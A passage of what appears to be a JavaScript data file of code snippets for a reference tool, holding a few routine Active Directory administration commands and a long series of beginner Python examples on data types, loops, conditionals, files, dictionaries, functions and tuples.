{id:"ad-computers", cat:"Active Directory", title:"Find AD computers / last logon",
 desc:"Domain-joined machines, OS, and last logon — find stale computer accounts. Needs RSAT.",
 code:{
  ps:`Get-ADComputer -Filter * -Properties OperatingSystem, LastLogonDate |
  Select-Object Name, OperatingSystem, LastLogonDate |
  Sort-Object LastLogonDate`,
  cmd:`dsquery computer -limit 0`
 }},
{id:"ad-repl-health", cat:"Active Directory", title:"Check DC replication health",
 desc:"Domain controller replication summary and health checks. Run with access to a DC (RSAT).",
 code:{
  ps:`repadmin /replsummary
dcdiag /q`,
  cmd:`repadmin /replsummary
dcdiag /q`
 }},

/* ================= PYTHON EXAMPLES ================= */

{id:"py-var-datatypes", cat:"Python Examples", title:"Basics · Values and data types",
 desc:"Every value has a type; inspect it with type().",
 code:{py:`# every value has a type
print(type(42))        # <class 'int'>
print(type(3.14))      # <class 'float'>
print(type("hi"))      # <class 'str'>
print(type(True))      # <class 'bool'>
print(type([1, 2]))    # <class 'list'>`}},
{id:"py-var-operators", cat:"Python Examples", title:"Basics · Operators and operands",
 desc:"Arithmetic operators combine operands into a new value.",
 code:{py:`print(7 + 3)     # 10   addition
print(7 - 3)     # 4
print(7 * 3)     # 21
print(7 / 3)     # 2.333...  true division (float)
print(7 // 3)    # 2    floor division
print(7 % 3)     # 1    modulo (remainder)
print(7 ** 3)    # 343  exponent`}},
{id:"py-var-calls", cat:"Python Examples", title:"Basics · Function calls",
 desc:"A call runs a function and yields a value usable in a bigger expression.",
 code:{py:`print(len("hello"))            # 5
print(max(3, 9, 2))            # 9
print(abs(-4) + round(2.7))    # 4 + 3 = 7  (calls nested in an expression)`}},
{id:"py-var-typeconv", cat:"Python Examples", title:"Basics · Type conversion functions",
 desc:"int(), float(), str(), bool() convert between types.",
 code:{py:`print(int("42") + 1)     # 43   str -> int
print(float("3.5"))      # 3.5
print(str(100) + "%")    # "100%"  int -> str
print(int(3.9))          # 3    truncates toward zero
print(bool(0), bool(2))  # False True`}},
{id:"py-var-variables", cat:"Python Examples", title:"Basics · Variables",
 desc:"A variable is a name bound to a value.",
 code:{py:`message = "Hello"
n = 17
pi = 3.14159
print(message, n, pi)`}},
{id:"py-var-names-keywords", cat:"Python Examples", title:"Basics · Variable names and keywords",
 desc:"Naming rules, and the reserved words you can't use as names.",
 code:{py:`# legal: letters, digits, underscore; cannot start with a digit
count = 0
_total = 0
user_name = "sam"
# reserved keywords cannot be used as names:
import keyword
print(keyword.kwlist)   # ['False','None','True','and', ...]`}},
{id:"py-var-stmt-vs-expr", cat:"Python Examples", title:"Basics · Statements vs. expressions",
 desc:"An expression has a value; a statement performs an action.",
 code:{py:`x = 3 + 4          # statement (assignment); 3 + 4 is an expression
print(x)           # statement that calls print
(3 + 4)            # an expression alone (value 7, but discarded)
y = (x * 2) - 1    # expression evaluated, result assigned
print(y)`}},
{id:"py-var-precedence", cat:"Python Examples", title:"Basics · Order of operations",
 desc:"PEMDAS: parentheses, exponent, mul/div, add/sub (left to right).",
 code:{py:`print(2 + 3 * 4)       # 14, not 20
print((2 + 3) * 4)     # 20
print(2 ** 3 ** 2)     # 512  (** is right-associative: 2**(3**2))
print(10 - 4 - 3)      # 3    (left to right)`}},
{id:"py-var-reassign", cat:"Python Examples", title:"Basics · Reassignment",
 desc:"A name can be rebound to a new value (even a new type).",
 code:{py:`x = 5
print(x)             # 5
x = "now a string"   # same name, new value
print(x)             # now a string`}},
{id:"py-var-update", cat:"Python Examples", title:"Basics · Updating variables",
 desc:"Read-modify-write, and the += / -= shorthands.",
 code:{py:`count = 0
count = count + 1     # read old value, add, store back
count += 1            # shorthand for the same
total = 100
total -= 25           # 75
print(count, total)`}},
{id:"py-var-input", cat:"Python Examples", title:"Basics · Input",
 desc:"input() reads a line from the keyboard and always returns a string.",
 code:{py:`# input() always returns a string
name = input("Your name: ")
print("Hi", name)
# convert when you need a number:
age = int(input("Your age: "))
print("Next year:", age + 1)`}},

{id:"py-err-syntax", cat:"Python Examples", title:"Errors · Syntax errors",
 desc:"Malformed code Python can't parse; the program won't start.",
 code:{py:`# a syntax error stops the program before it runs (shown here as comments)
# print("hi"      <- SyntaxError: '(' was never closed
# if x  == 1      <- SyntaxError: expected ':'
print("Fix the punctuation, then the file will run.")`}},
{id:"py-err-runtime", cat:"Python Examples", title:"Errors · Runtime errors",
 desc:"Errors raised while running, at a specific line (exceptions).",
 code:{py:`nums = [1, 2, 3]
# print(nums[5])   # IndexError at runtime
print(10 / 2)      # runs fine
# print(10 / 0)    # ZeroDivisionError at runtime`}},
{id:"py-err-semantic", cat:"Python Examples", title:"Errors · Semantic errors",
 desc:"Runs without error but produces the wrong answer (a logic bug).",
 code:{py:`# want the average of 2 and 4:
avg = 2 + 4 / 2      # BUG: gives 4.0 (precedence), not 3.0
print(avg)           # 4.0  <- wrong
avg = (2 + 4) / 2    # fixed
print(avg)           # 3.0`}},
{id:"py-err-syntaxerror", cat:"Python Examples", title:"Errors · SyntaxError",
 desc:"Common causes of the SyntaxError Python raises at parse time.",
 code:{py:`# SyntaxError: code Python can't parse. Common causes:
#   missing ':'      ->  if x > 0
#   unmatched ()     ->  print("hi"
#   invalid target   ->  5 = x
print("the examples above are shown as comments so this file still runs")`}},
{id:"py-err-typeerror", cat:"Python Examples", title:"Errors · TypeError",
 desc:"An operation applied to the wrong type.",
 code:{py:`try:
    result = "age: " + 30      # can't concatenate str and int
except TypeError as e:
    print("TypeError:", e)
print("fix:", "age: " + str(30))`}},
{id:"py-err-nameerror", cat:"Python Examples", title:"Errors · NameError",
 desc:"Using a name that was never defined (often a typo).",
 code:{py:`try:
    print(totl)        # meant 'total'
except NameError as e:
    print("NameError:", e)
total = 10
print(total)`}},
{id:"py-err-valueerror", cat:"Python Examples", title:"Errors · ValueError",
 desc:"Right type, but an inappropriate value.",
 code:{py:`try:
    n = int("twelve")     # can't parse this as an int
except ValueError as e:
    print("ValueError:", e)
print(int("12"))          # works`}},

{id:"py-mod-import", cat:"Python Examples", title:"Modules · Importing modules",
 desc:"import, from-import, and aliasing with as.",
 code:{py:`import math                     # whole module
from random import randint      # one name from a module
import statistics as stats      # with an alias
print(math.sqrt(16))            # 4.0
print(randint(1, 6))            # a die roll
print(stats.mean([2, 4, 6]))    # 4`}},
{id:"py-mod-random", cat:"Python Examples", title:"Modules · The random module",
 desc:"Random floats, integers, choices, and in-place shuffle.",
 code:{py:`import random
print(random.random())            # float in [0.0, 1.0)
print(random.randint(1, 6))       # int 1..6 inclusive
print(random.choice(["a", "b", "c"]))
deck = [1, 2, 3, 4, 5]
random.shuffle(deck)              # shuffles in place
print(deck)`}},

{id:"py-turtle", cat:"Python Examples", title:"Turtle · The turtle module",
 desc:"Instances, attributes, and methods; opens a graphics window.",
 code:{py:`import turtle
wn = turtle.Screen()      # a Screen instance
t = turtle.Turtle()       # a Turtle instance (object)
t.color("blue")           # set drawing state via methods
t.pensize(3)
for _ in range(4):        # draw a square by calling methods
    t.forward(100)
    t.right(90)
wn.mainloop()             # keep the window open`}},

{id:"py-seq-types", cat:"Python Examples", title:"Sequences · Strings, lists, tuples",
 desc:"Three sequence types: str and tuple are immutable, list is mutable.",
 code:{py:`s = "hello"            # string  (immutable sequence of chars)
lst = [1, 2, 3]        # list    (mutable sequence)
tup = (4, 5, 6)        # tuple   (immutable sequence)
print(s, lst, tup)
print(type(s), type(lst), type(tup))`}},
{id:"py-seq-index", cat:"Python Examples", title:"Sequences · Index operator",
 desc:"Access an item by position; indexing starts at 0, negatives count from the end.",
 code:{py:`s = "PYTHON"
print(s[0])    # 'P'  first item
print(s[2])    # 'T'
print(s[-1])   # 'N'  last item
data = [10, 20, 30]
print(data[1]) # 20`}},
{id:"py-seq-len", cat:"Python Examples", title:"Sequences · Length (len)",
 desc:"len() returns the number of items in a sequence.",
 code:{py:`print(len("hello"))       # 5
print(len([1, 2, 3, 4]))  # 4
print(len(()))            # 0
word = "banana"
print(word[len(word) - 1])   # last char via len`}},
{id:"py-seq-slice", cat:"Python Examples", title:"Sequences · Slice operator",
 desc:"start:stop:step returns a sub-sequence (stop excluded).",
 code:{py:`s = "abcdefg"
print(s[1:4])    # 'bcd'   start:stop
print(s[:3])     # 'abc'   from start
print(s[4:])     # 'efg'   to end
print(s[::2])    # 'aceg'  step
print(s[::-1])   # 'gfedcba' reversed`}},
{id:"py-seq-concat-repeat", cat:"Python Examples", title:"Sequences · Concatenation and repetition",
 desc:"+ joins sequences; * repeats them.",
 code:{py:`print([1, 2] + [3, 4])   # [1, 2, 3, 4]  concatenation
print("ab" + "cd")       # 'abcd'
print("=" * 10)          # '=========='  repetition
print([0] * 3)           # [0, 0, 0]`}},
{id:"py-seq-count-index", cat:"Python Examples", title:"Sequences · count and index",
 desc:"count() tallies occurrences; index() finds the first position.",
 code:{py:`nums = [1, 2, 2, 3, 2]
print(nums.count(2))     # 3   how many times 2 appears
print(nums.index(3))     # 3   position of first 3
print("banana".count("a"))  # 3
print("banana".index("n"))  # 2`}},
{id:"py-seq-split-join", cat:"Python Examples", title:"Sequences · Splitting and joining strings",
 desc:"split() a string into a list; join() a list into a string.",
 code:{py:`csv = "sam,42,blue"
parts = csv.split(",")        # ['sam', '42', 'blue']
print(parts)
sentence = "the quick fox"
print(sentence.split())       # splits on whitespace
joined = "-".join(["2024", "01", "15"])
print(joined)                 # '2024-01-15'`}},

{id:"py-for-loop", cat:"Python Examples", title:"For loops · The for loop",
 desc:"Run a block once for each item in a sequence.",
 code:{py:`for i in [1, 2, 3]:
    print("count:", i)
print("done")`}},
{id:"py-for-strings", cat:"Python Examples", title:"For loops · Iterating over strings",
 desc:"A string is iterable one character at a time.",
 code:{py:`for ch in "cat":
    print(ch)          # c, a, t on separate lines`}},
{id:"py-for-lists", cat:"Python Examples", title:"For loops · Iterating over lists",
 desc:"Loop directly over list elements.",
 code:{py:`fruits = ["apple", "pear", "fig"]
for fruit in fruits:
    print(fruit.upper())`}},
{id:"py-for-range", cat:"Python Examples", title:"For loops · The range function",
 desc:"range(start, stop, step) generates a sequence of integers.",
 code:{py:`print(list(range(5)))        # [0, 1, 2, 3, 4]
print(list(range(2, 8)))     # [2, 3, 4, 5, 6, 7]
print(list(range(0, 10, 2))) # [0, 2, 4, 6, 8]
for i in range(3):
    print("i =", i)`}},
{id:"py-for-accumulator", cat:"Python Examples", title:"For loops · The accumulator pattern",
 desc:"Initialize a total, update it each pass, use it after the loop.",
 code:{py:`total = 0                 # initialize accumulator
for n in [4, 7, 1, 9]:
    total = total + n     # update each pass
print("sum:", total)      # 21`}},
{id:"py-for-index", cat:"Python Examples", title:"For loops · Traversal by index",
 desc:"Loop over range(len(seq)) when you need positions.",
 code:{py:`letters = ["a", "b", "c"]
for i in range(len(letters)):
    print(i, letters[i])      # index and value`}},
{id:"py-for-nested", cat:"Python Examples", title:"For loops · Nested iteration",
 desc:"A loop inside a loop — the inner runs fully each outer pass.",
 code:{py:`for row in range(1, 4):
    for col in range(1, 4):
        print(f"{row}x{col}={row*col}", end="  ")
    print()               # newline after each row`}},

{id:"py-cond-bool", cat:"Python Examples", title:"Conditionals · Boolean values and expressions",
 desc:"Comparisons produce True/False of type bool.",
 code:{py:`print(5 > 3)        # True
print(5 == 3)       # False
print(5 != 3)       # True
x = 10
print(x >= 10)      # True
print(type(True))   # <class 'bool'>`}},
{id:"py-cond-logical", cat:"Python Examples", title:"Conditionals · Logical operators (and/or/not)",
 desc:"Combine booleans with and, or, not.",
 code:{py:`print(True and False)   # False  (both must be true)
print(True or False)    # True   (either)
print(not True)         # False
age = 25
print(age > 18 and age < 65)   # True`}},
{id:"py-cond-shortcircuit", cat:"Python Examples", title:"Conditionals · Short-circuit evaluation",
 desc:"'and' stops at the first False, 'or' at the first True — the rest is skipped.",
 code:{py:`def loud():
    print("evaluated!")
    return True
print(False and loud())   # loud() never runs -> False
print(True or loud())     # loud() never runs -> True
# use it as a guard:
x = 0
print(x != 0 and (10 / x) > 1)   # right side skipped, no ZeroDivisionError`}},
{id:"py-cond-in", cat:"Python Examples", title:"Conditionals · in and not in operators",
 desc:"Test membership in a sequence or dict.",
 code:{py:`print("a" in "cat")            # True
print(3 in [1, 2, 3])          # True
print("z" not in "cat")        # True
print("key" in {"key": 1})     # True (checks dict keys)`}},
{id:"py-cond-precedence", cat:"Python Examples", title:"Conditionals · Operator precedence",
 desc:"Arithmetic, then comparisons, then not, and, or.",
 code:{py:`print(2 + 3 == 5)              # True  (arithmetic before ==)
print(True or False and False) # True  (and before or)
print(not 5 > 3)               # False (> before not)`}},
{id:"py-cond-ifelse", cat:"Python Examples", title:"Conditionals · Binary selection (if/else)",
 desc:"Choose between exactly two paths.",
 code:{py:`n = 7
if n % 2 == 0:
    print("even")
else:
    print("odd")`}},
{id:"py-cond-if", cat:"Python Examples", title:"Conditionals · Unary selection (if only)",
 desc:"Run a block only when a condition is true.",
 code:{py:`temp = 95
if temp > 90:
    print("It's hot!")     # runs only when condition is True
print("done")              # always runs`}},
{id:"py-cond-nested", cat:"Python Examples", title:"Conditionals · Nested conditionals",
 desc:"An if inside another if.",
 code:{py:`x = 5
if x >= 0:
    if x == 0:
        print("zero")
    else:
        print("positive")
else:
    print("negative")`}},
{id:"py-cond-elif", cat:"Python Examples", title:"Conditionals · Chained conditionals (elif)",
 desc:"Test several conditions in order; the first true one wins.",
 code:{py:`score = 82
if score >= 90:
    grade = "A"
elif score >= 80:
    grade = "B"
elif score >= 70:
    grade = "C"
else:
    grade = "F"
print(grade)      # B`}},
{id:"py-cond-accum-max", cat:"Python Examples", title:"Conditionals · Accumulator with conditionals (max)",
 desc:"Track a running best value with a conditional update.",
 code:{py:`nums = [3, 41, 12, 9, 74, 15]
biggest = nums[0]              # start with the first
for n in nums:
    if n > biggest:           # conditional update
        biggest = n
print("max:", biggest)        # 74`}},

{id:"py-mut-mutability", cat:"Python Examples", title:"Mutation · Mutability vs. immutability",
 desc:"Lists can be changed in place; strings and tuples cannot.",
 code:{py:`lst = [1, 2, 3]
lst[0] = 99          # OK: lists are mutable
print(lst)           # [99, 2, 3]
s = "abc"
# s[0] = "z"         # TypeError: strings are immutable
s = "zbc"            # must rebuild instead
print(s)`}},
{id:"py-mut-del", cat:"Python Examples", title:"Mutation · List element deletion (del)",
 desc:"Remove items by index or slice with del.",
 code:{py:`lst = ["a", "b", "c", "d"]
del lst[1]           # remove by index
print(lst)           # ['a', 'c', 'd']
del lst[0:2]         # remove a slice
print(lst)           # ['d']`}},
{id:"py-mut-refs", cat:"Python Examples", title:"Mutation · Objects and references",
 desc:"A variable holds a reference to an object; is vs ==.",
 code:{py:`a = [1, 2, 3]
b = a                 # b refers to the SAME object
print(a is b)         # True
c = [1, 2, 3]
print(a == c)         # True  (same contents)
print(a is c)         # False (different objects)`}},
{id:"py-mut-aliasing", cat:"Python Examples", title:"Mutation · Aliasing",
 desc:"Two names for one mutable object — changes show through both.",
 code:{py:`a = [1, 2, 3]
b = a                # alias: two names, one list
b.append(4)
print(a)             # [1, 2, 3, 4]  <- change shows through 'a' too`}},
{id:"py-mut-clone", cat:"Python Examples", title:"Mutation · Cloning lists",
 desc:"Make an independent copy so mutations don't leak.",
 code:{py:`a = [1, 2, 3]
b = a[:]             # slice makes a copy
b.append(4)
print(a)             # [1, 2, 3]      unchanged
print(b)             # [1, 2, 3, 4]
# also: b = list(a)  or  b = a.copy()`}},
{id:"py-mut-listmethods", cat:"Python Examples", title:"Mutation · Mutating list methods",
 desc:"append, insert, remove, pop, sort change the list in place.",
 code:{py:`lst = [3, 1, 2]
lst.append(4)        # add to end
lst.insert(0, 0)     # insert at index
lst.remove(1)        # remove first matching value
popped = lst.pop()   # remove & return last
lst.sort()           # sort in place
print(lst, "popped:", popped)`}},
{id:"py-mut-append-vs-concat", cat:"Python Examples", title:"Mutation · Append vs. concatenate",
 desc:"append mutates in place; + builds a new list.",
 code:{py:`a = [1, 2]
a.append(3)          # mutates a in place -> [1, 2, 3]
print(a)
b = [1, 2]
b = b + [3]          # builds a NEW list, rebinds b
print(b)             # [1, 2, 3]`}},
{id:"py-mut-strmethods", cat:"Python Examples", title:"Mutation · Non-mutating string methods",
 desc:"String methods return new strings; the original is unchanged.",
 code:{py:`s = "Hello, World"
print(s.upper())     # 'HELLO, WORLD'  (returns new string)
print(s.lower())
print(s.replace("l", "L"))
print(s.strip())
print(s)             # original unchanged: 'Hello, World'`}},
{id:"py-mut-format", cat:"Python Examples", title:"Mutation · String .format() method",
 desc:"Fill {} placeholders positionally or by name.",
 code:{py:`name, score = "Sam", 95
print("{} scored {}".format(name, score))
print("{0} + {0} = {1}".format(2, 4))       # positional
print("{n} is {a}".format(n="Ana", a=30))   # named
print("{:.2f}".format(3.14159))             # '3.14'`}},
{id:"py-mut-fstrings", cat:"Python Examples", title:"Mutation · f-strings",
 desc:"Inline expressions and formatting inside f\"...\".",
 code:{py:`name, score = "Sam", 95
print(f"{name} scored {score}")
print(f"{2} + {2} = {2 + 2}")     # expressions inside
pi = 3.14159
print(f"{pi:.2f}")                # '3.14'
print(f"{name!r}")               # 'Sam' with quotes (repr)`}},
{id:"py-mut-accum-list", cat:"Python Examples", title:"Mutation · Accumulator pattern with lists",
 desc:"Start empty, append each computed item.",
 code:{py:`squares = []                 # start empty
for n in range(1, 6):
    squares.append(n * n)    # accumulate items
print(squares)               # [1, 4, 9, 16, 25]`}},
{id:"py-mut-accum-str", cat:"Python Examples", title:"Mutation · Accumulator pattern with strings",
 desc:"Build a string up piece by piece.",
 code:{py:`acronym = ""                       # start empty
for word in ["Portable", "Network", "Graphics"]:
    acronym = acronym + word[0]    # build up
print(acronym)                     # 'PNG'`}},

{id:"py-file-read", cat:"Python Examples", title:"Files · Reading a file",
 desc:"read() loads the whole file into one string. Needs the file to exist.",
 code:{py:`with open("notes.txt", "r") as f:
    contents = f.read()
print(contents)`}},
{id:"py-file-read-alt", cat:"Python Examples", title:"Files · Alternative file-reading methods",
 desc:"readline() reads one line; readlines() returns a list of lines.",
 code:{py:`with open("notes.txt", "r") as f:
    line = f.readline()      # one line (keeps trailing newline)
    print(line.rstrip())
with open("notes.txt", "r") as f:
    lines = f.readlines()    # list of all lines
    print(len(lines), "lines")`}},
{id:"py-file-iter", cat:"Python Examples", title:"Files · Iterating over lines in a file",
 desc:"Loop the file object directly — memory-friendly.",
 code:{py:`with open("notes.txt", "r") as f:
    for line in f:                 # line by line
        print(line.rstrip())       # rstrip drops the newline`}},
{id:"py-file-with", cat:"Python Examples", title:"Files · Using with (context manager)",
 desc:"with auto-closes the file, even if an error occurs.",
 code:{py:`with open("notes.txt", "r") as f:
    data = f.read()
# f is closed automatically here
print("closed?", f.closed)         # True`}},
{id:"py-file-write", cat:"Python Examples", title:"Files · Writing text files",
 desc:"Open in 'w' (truncate/create) or 'a' (append), then write().",
 danger:"Creates/overwrites out.txt in the working directory.",
 code:{py:`with open("out.txt", "w") as f:
    f.write("line one\\n")
    f.write("line two\\n")
print("wrote out.txt")`}},
{id:"py-file-csv-format", cat:"Python Examples", title:"Files · CSV format",
 desc:"Comma-separated values: one record per line, fields split on commas.",
 code:{py:`sample = "name,age,city\\nSam,42,Denver\\nAna,30,Reno"
for line in sample.split("\\n"):
    fields = line.split(",")
    print(fields)`}},
{id:"py-file-csv-read", cat:"Python Examples", title:"Files · Reading data from a CSV",
 desc:"csv.reader yields each row as a list of strings.",
 code:{py:`import csv
with open("people.csv", newline="") as f:
    reader = csv.reader(f)
    header = next(reader)          # first row = column names
    print("columns:", header)
    for row in reader:
        print(row)                 # each row is a list of strings`}},
{id:"py-file-csv-write", cat:"Python Examples", title:"Files · Writing data to a CSV",
 desc:"csv.writer serializes rows correctly (quoting, commas).",
 danger:"Creates/overwrites people.csv in the working directory.",
 code:{py:`import csv
rows = [["name", "age"], ["Sam", 42], ["Ana", 30]]
with open("people.csv", "w", newline="") as f:
    writer = csv.writer(f)
    writer.writerows(rows)         # write all rows at once
print("wrote people.csv")`}},

{id:"py-dict-intro", cat:"Python Examples", title:"Dictionaries · Dictionaries",
 desc:"Store key -> value pairs; look up by key.",
 code:{py:`ages = {"Sam": 42, "Ana": 30}
print(ages["Sam"])        # 42
ages["Kim"] = 25          # add a pair
print(ages)`}},
{id:"py-dict-ops", cat:"Python Examples", title:"Dictionaries · Dictionary operations",
 desc:"Add/update, delete, membership, and length.",
 code:{py:`d = {"a": 1, "b": 2}
d["c"] = 3            # add / update
del d["a"]           # delete a key
print("b" in d)      # True  (membership tests keys)
print(len(d))        # 2`}},
{id:"py-dict-methods", cat:"Python Examples", title:"Dictionaries · Dictionary methods",
 desc:"keys(), values(), items(), get().",
 code:{py:`d = {"a": 1, "b": 2}
print(list(d.keys()))     # ['a', 'b']
print(list(d.values()))   # [1, 2]
print(list(d.items()))    # [('a', 1), ('b', 2)]
print(d.get("z", 0))      # 0 default`}},
{id:"py-dict-iter", cat:"Python Examples", title:"Dictionaries · Iterating over dictionaries",
 desc:"Looping a dict yields keys; use items() for key+value.",
 code:{py:`scores = {"Sam": 95, "Ana": 88}
for name in scores:                 # iterates keys
    print(name, scores[name])
for name, score in scores.items():  # key and value
    print(f"{name}: {score}")`}},
{id:"py-dict-get", cat:"Python Examples", title:"Dictionaries · Safely retrieving values (.get)",
 desc:".get() returns a default instead of raising KeyError.",
 code:{py:`d = {"a": 1}
print(d.get("a"))        # 1
print(d.get("z"))        # None (no KeyError)
print(d.get("z", 0))     # 0   supply a default`}},
{id:"py-dict-alias-copy", cat:"Python Examples", title:"Dictionaries · Aliasing and copying",
 desc:"Assignment aliases; .copy() makes an independent dict.",
 code:{py:`a = {"x": 1}
b = a                 # alias: same dict
b["y"] = 2
print(a)              # {'x': 1, 'y': 2}  changed too
c = a.copy()          # independent copy
c["z"] = 9
print(a)              # unchanged by c`}},
{id:"py-dict-accum", cat:"Python Examples", title:"Dictionaries · Accumulating results in a dictionary",
 desc:"Tally counts using get() with a default.",
 code:{py:`text = "to be or not to be"
counts = {}
for word in text.split():
    counts[word] = counts.get(word, 0) + 1   # tally
print(counts)     # {'to': 2, 'be': 2, 'or': 1, 'not': 1}`}},
{id:"py-dict-best-key", cat:"Python Examples", title:"Dictionaries · Accumulating the best key",
 desc:"Scan a dict to find the key with the largest value.",
 code:{py:`counts = {"to": 2, "be": 2, "or": 1, "not": 1}
best = None
for word in counts:
    if best is None or counts[word] > counts[best]:
        best = word            # track key with the largest value
print("most common:", best)`}},

{id:"py-fn-def", cat:"Python Examples", title:"Functions · Function definition",
 desc:"def creates a function; defining it doesn't run it.",
 code:{py:`def greet():
    print("Hello!")
    print("Welcome.")
# defining does not run it
greet()          # now it runs`}},
{id:"py-fn-invoke", cat:"Python Examples", title:"Functions · Function invocation",
 desc:"Call a function with (); calls can nest.",
 code:{py:`def square(x):
    return x * x
print(square(5))            # 25
print(square(square(3)))   # square(9) -> 81`}},
{id:"py-fn-params", cat:"Python Examples", title:"Functions · Parameters",
 desc:"Parameters receive arguments positionally or by keyword.",
 code:{py:`def power(base, exp):        # two parameters
    return base ** exp
print(power(2, 10))          # 1024  (positional args)
print(power(exp=3, base=2))  # 8     (keyword args)`}},
{id:"py-fn-return", cat:"Python Examples", title:"Functions · Returning a value",
 desc:"return sends a value back to the caller.",
 code:{py:`def add(a, b):
    return a + b       # hands a value back
total = add(3, 4)
print(total)           # 7`}},
{id:"py-fn-annotations", cat:"Python Examples", title:"Functions · Type annotations",
 desc:"Document parameter/return types; Python does not enforce them.",
 code:{py:`def repeat(text: str, times: int) -> str:
    return text * times
print(repeat("ab", 3))     # 'ababab'`}},
{id:"py-fn-accum", cat:"Python Examples", title:"Functions · A function that accumulates",
 desc:"Wrap the accumulator pattern in a reusable function.",
 code:{py:`def total(nums):
    acc = 0
    for n in nums:
        acc += n
    return acc
print(total([1, 2, 3, 4]))   # 10`}},
{id:"py-fn-local", cat:"Python Examples", title:"Functions · Local scope",
 desc:"Variables/parameters live only inside the function.",
 code:{py:`def f():
    x = 10        # local to f
    print(x)
f()
# print(x)        # NameError: x doesn't exist out here`}},
{id:"py-fn-global", cat:"Python Examples", title:"Functions · Global variables",
 desc:"global lets a function rebind a module-level name.",
 code:{py:`count = 0
def bump():
    global count      # rebind the module-level name
    count += 1
bump(); bump()
print(count)          # 2`}},
{id:"py-fn-composition", cat:"Python Examples", title:"Functions · Composition",
 desc:"Feed one function's result into another.",
 code:{py:`def double(x): return x * 2
def inc(x):    return x + 1
print(double(inc(4)))     # double(5) -> 10`}},
{id:"py-fn-print-vs-return", cat:"Python Examples", title:"Functions · Print vs. return",
 desc:"print shows a value; return hands it back (a printing function returns None).",
 code:{py:`def add_p(a, b): print(a + b)    # shows it, returns None
def add_r(a, b): return a + b    # hands value back
x = add_p(2, 3)     # prints 5
print("got:", x)    # got: None
y = add_r(2, 3)
print("got:", y)    # got: 5`}},
{id:"py-fn-mutable-args", cat:"Python Examples", title:"Functions · Passing mutable objects",
 desc:"A function can mutate a list/dict passed to it.",
 code:{py:`def add_item(lst):
    lst.append("new")     # mutates the caller's list
items = ["a"]
add_item(items)
print(items)              # ['a', 'new']`}},
{id:"py-fn-side-effects", cat:"Python Examples", title:"Functions · Side effects",
 desc:"Changing state outside the function (printing, mutating, files).",
 code:{py:`log = []
def record(msg):
    log.append(msg)       # side effect: mutates outer list
    print(msg)            # side effect: output
record("start")
print(log)                # ['start']`}},

{id:"py-tup-packing", cat:"Python Examples", title:"Tuples · Tuple packing",
 desc:"Comma-separated values pack into a tuple (parens optional).",
 code:{py:`point = 3, 4          # -> (3, 4)
print(point)
print(type(point))    # <class 'tuple'>`}},
{id:"py-tup-unpack", cat:"Python Examples", title:"Tuples · Tuple assignment with unpacking",
 desc:"Spread a tuple across several names at once.",
 code:{py:`point = (3, 4)
x, y = point          # unpack into two names
print(x, y)           # 3 4`}},
{id:"py-tup-swap", cat:"Python Examples", title:"Tuples · Swapping values",
 desc:"Swap two variables in one line, no temp needed.",
 code:{py:`a, b = 1, 2
a, b = b, a           # swap
print(a, b)           # 2 1`}},
{id:"py-tup-iter-unpack", cat:"Python Examples", title:"Tuples · Unpacking into iterator variables",
 desc:"Unpack each tuple as you loop a list of tuples.",
 code:{py:`pairs = [(1, "a"), (2, "b"), (3, "c")]
for num, letter in pairs:      # unpack each tuple
    print(num, letter)`}},
{id:"py-tup-enumerate", cat:"Python Examples", title:"Tuples · enumerate",
 desc:"Loop with both an index and the value.",
 code:{py:`for i, item in enumerate(["a", "b", "c"]):
    print(i, item)             # 0 a / 1 b / 2 c
for i, item in enumerate(["x", "y"], start=1):
    print(i, item)             # 1 x / 2 y`}},
{id:"py-tup-return", cat:"Python Examples", title:"Tuples · Tuples as return values",
 desc:"Return several values as a tuple, then unpack them.",
 code:{py:`def min_max(nums):
    return min(nums), max(nums)   # returns a tuple
lo, hi = min_max([4, 1, 8, 3])
print(lo, hi)                     # 1 8`}},
{id:"py-tup-arg-unpack", cat:"Python Examples", title:"Tuples · Unpacking tuples as function arguments",
 desc:"* spreads a tuple into positional arguments.",
 code:{py:`def add(a, b, c):
    return a + b + c
args = (1, 2, 3)
print(add(*args))       # -> add(1, 2, 3) -> 6`}},

{id:"py-while", cat:"Python Examples", title:"While loops · The while statement",
 desc:"Repeat while a condition stays true; move toward the exit.",
 code:{py:`n = 5
while n > 0:
    print(n)
    n -= 1              # must progress toward stopping
print("liftoff")`}},
{id:"py-while-listener", cat:"Python Examples", title:"While loops · The listener loop",
 desc:"Keep reading input until told to stop. Reads from the keyboard.",
 code:{py:`while True:
    cmd = input("command (quit to exit): ")
    if cmd == "quit":
        break
    print("you said:", cmd)`}},
{id:"py-while-sentinel", cat:"Python Examples", title:"While loops · Sentinel values",
 desc:"A special value signals the loop to end. Reads from the keyboard.",
 code:{py:`total = 0
while True:
    entry = input("number (blank to finish): ")
    if entry == "":            # sentinel
        break
    total += int(entry)
print("total:", total)`}},
{id:"py-while-validation", cat:"Python Examples", title:"While loops · Input validation",
 desc:"Loop until the input passes a check. Reads from the keyboard.",
 code:{py:`while True:
    age = input("Age (0-120): ")
    if age.isdigit() and 0 <= int(age) <= 120:
        break
    print("try again")
print("ok:", age)`}},
{id:"py-while-break-continue", cat:"Python Examples", title:"While loops · break and continue",
 desc:"break exits the loop; continue skips to the next pass.",
 code:{py:`for n in range(1, 10):
    if n == 3:
        continue        # skip the rest of THIS pass
    if n == 6:
        break           # exit the loop entirely
    print(n)            # 1, 2, 4, 5`}},

{id:"py-adv-optional", cat:"Python Examples", title:"Adv. functions · Optional parameters",
 desc:"Give a parameter a default so callers may omit it.",
 code:{py:`def greet(name, greeting="Hello"):
    print(greeting, name)
greet("Sam")                 # Hello Sam
greet("Ana", "Hi")           # Hi Ana`}},
{id:"py-adv-keyword", cat:"Python Examples", title:"Adv. functions · Keyword parameters",
 desc:"Pass arguments by name, in any order.",
 code:{py:`def box(width, height, fill="."):
    print(f"{width}x{height} filled with {fill}")
box(height=2, width=5)          # order-independent
box(3, 3, fill="#")`}},
{id:"py-adv-lambda", cat:"Python Examples", title:"Adv. functions · Anonymous functions (lambda)",
 desc:"A small inline function, often used as a key.",
 code:{py:`square = lambda x: x * x       # tiny inline function
print(square(6))               # 36
pts = [(1, 5), (3, 2), (2, 8)]
print(sorted(pts, key=lambda p: p[1]))   # sort by 2nd item`}},
{id:"py-adv-methods", cat:"Python Examples", title:"Adv. functions · Method invocations",
 desc:"Methods are functions on an object, called with dot syntax.",
 code:{py:`s = "hello"
print(s.upper())        # 'HELLO'
nums = [3, 1, 2]
nums.sort()             # method mutates the list
print(nums)`}},
{id:"py-adv-decorator", cat:"Python Examples", title:"Adv. functions · Function wrapping and decorators",
 desc:"A decorator wraps a function to extend its behavior.",
 code:{py:`def shout(func):                 # wraps another function
